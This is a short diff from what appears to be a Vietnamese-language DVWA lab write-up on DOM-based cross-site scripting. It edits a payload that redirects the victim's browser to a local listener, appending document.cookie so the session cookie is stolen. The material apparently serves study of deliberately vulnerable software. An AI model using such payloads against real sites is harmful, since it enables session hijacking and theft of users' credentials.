@@ -16,7 +16,7 @@ Pwn time:
 2. Tạo payload độc, lừa user nhập vào
 Payload gốc:
 ```
-<script>window.location='http://127.0.0.1:8000/?cookie=' + document.cookie</script>
+127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English<script>window.location='http://127.0.0.1:8000/?cookie' + document.cookie</script>
 ```
 ![image](https://github.com/user-attachments/assets/ee01b5a4-71a4-48cf-b0db-9b04016eaefc)
 *Nó sẽ ra 1 trang ntn*
